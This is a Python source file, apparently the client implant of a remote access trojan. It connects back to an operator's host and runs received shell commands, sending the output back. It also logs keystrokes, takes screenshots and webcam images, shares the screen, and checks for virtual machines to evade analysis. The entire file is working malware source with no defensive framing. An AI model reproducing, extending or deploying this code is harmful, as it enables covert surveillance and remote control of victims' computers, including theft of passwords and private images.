#mods/client.py
class CLIENT:

    SOCK = None
    KEY  = ")J@NcRfU"
    KEYLOGGER_STATUS = False
    KEYLOGGER_STROKES = ""

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port      = _pt

    def send_data(self, tosend, encode=True):
        if encode:
            if isinstance(tosend, bytes):
                tosend = tosend.decode('utf-8', errors='ignore') 
            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))

        else:
            if isinstance(tosend, str):
                tosend = tosend.encode('utf-8')
            self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))
    
    def turn_keylogger(self, status):
        if HAVE_X:
            def on_press(key):
                if not self.KEYLOGGER_STATUS:
                    return False

                key = str(key)
                if len(key.strip('\'')) == 1:
                    self.KEYLOGGER_STROKES += key.strip('\'')
                else:
                    self.KEYLOGGER_STROKES += ("[" + key + "]")

            def on_release(key):
                if not self.KEYLOGGER_STATUS:
                    return False

            def logger():            
                with Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()

            if status:
                if not self.KEYLOGGER_STATUS:
                    self.KEYLOGGER_STATUS = True
                    t = threading.Thread(target=logger)
                    t.daemon = True
                    t.start()
            else:
                self.KEYLOGGER_STATUS = False

    def execute(self, command):
        data = command.decode('utf-8').split(":")

        if data[0] == "shell":

            #print("Executing Shell: " + data[1])
            toexecute = data[1].rstrip(" ").lstrip(" ")
            toexecute = " ".join(toexecute.split())
            if toexecute.split(" ")[0] == "cd":
                try:
                    os.chdir(toexecute.split(" ")[1])
                    self.send_data("")
                except:
                    self.send_data("Error while changing directory!")
            else:
                try:
                    comm = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    output, errors = comm.communicate()
                    self.send_data(output + errors)
                except FileNotFoundError:
                    self.send_data("No Such File or Directory")

        elif data[0] == "keylogger" and HAVE_X:

            # print("Executing Keylogger: " + data[1])
            if data[1] == "on":
                self.turn_keylogger(True)
                self.send_data("")
            elif data[1] == "off":
                self.turn_keylogger(False)
                self.send_data("")
            elif data[1] == "dump":
                self.send_data(self.KEYLOGGER_STROKES)

        elif data[0] == "sysinfo":
            # print("Executing Sysinfo: " + data[1])
            sysinfo = SYSINFO()
            self.send_data(sysinfo.get_data())

        elif data[0] == "screenshot":
            # print("Executing Screenshot: " + data[1])
            screenshot = SCREENSHOT()
            self.send_data(screenshot.get_data(), encode=False)
    
        elif data[0] == "webcam":
            # print("Executing webcam: " + data[1])
            webcam = WEBCAM()
            self.send_data(webcam.get_data(), encode=False)


        elif data[0] == "screenshare":
            # print("Executing Screenshare: " + data[1])
            from mods.screenshare import ScreenShareServer
            port = 8080
            self.screenshare = ScreenShareServer(port=port)  
            url = f"http://{self.screenshare.get_local_ip()}:{port}/screenshare"
            self.send_data(url)

        elif data[0] == "antivm":
            # print("Executing Antivm: " + data[1])
            
            detected = AntiVM(verbose=False)
            self.send_data(detected.get_data())

        else:
            # print("Executing Unknown command: " + data[0])
            print(f"[!] Unknown command: {data[0]}")
            self.send_data(f"Unknown command: {data[0]}".encode('utf-8'))


    def acceptor(self):
        data = b"" 

        while True:
            try:
                chunk = self.SOCK.recv(4096)
                if not chunk:
                    print("[!] Connection closed by remote host.")
                    break

                data += chunk

                if self.KEY.encode('utf-8') in data:
                    parts = data.split(self.KEY.encode('utf-8'))
                    payload = parts[0] 
                    try:
                        decoded = base64.decodebytes(payload)
                        t = threading.Thread(target=self.execute, args=(decoded,))
                        t.daemon = True
                        t.start()
                    except Exception as e:
                        print(f"[!] Failed to decode or execute: {e}")
                    data = b""

            except ConnectionResetError:
                print("[!] Connection forcibly closed by remote host (WinError 10054).")
                break
            except Exception as e:
                print(f"[!] Unexpected error in acceptor: {e}")
                break
            except KeyboardInterrupt:
                print("[!] Keyboard interrupt received, closing connection.")
                break

    def engage(self):
        while True:
            try:
                # print(f"[+] Connecting to {self.ipaddress}:{self.port} ...")
                self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.SOCK.connect((self.ipaddress, self.port))
                # print("[OK] Connected successfully!")



                try:
                    self.acceptor() 
                except Exception as e:
                    # print(f"[!] Connection lost during session: {e}")
                    self.SOCK.close()
                    time.sleep(5)
                    continue

            except ConnectionRefusedError:
                # print("[!] Connection refused, retrying in 5 seconds...")
                time.sleep(5)
                continue
            except Exception as e:
                # print(f"[!] Unexpected error in engage: {e}")
                time.sleep(5)
                continue


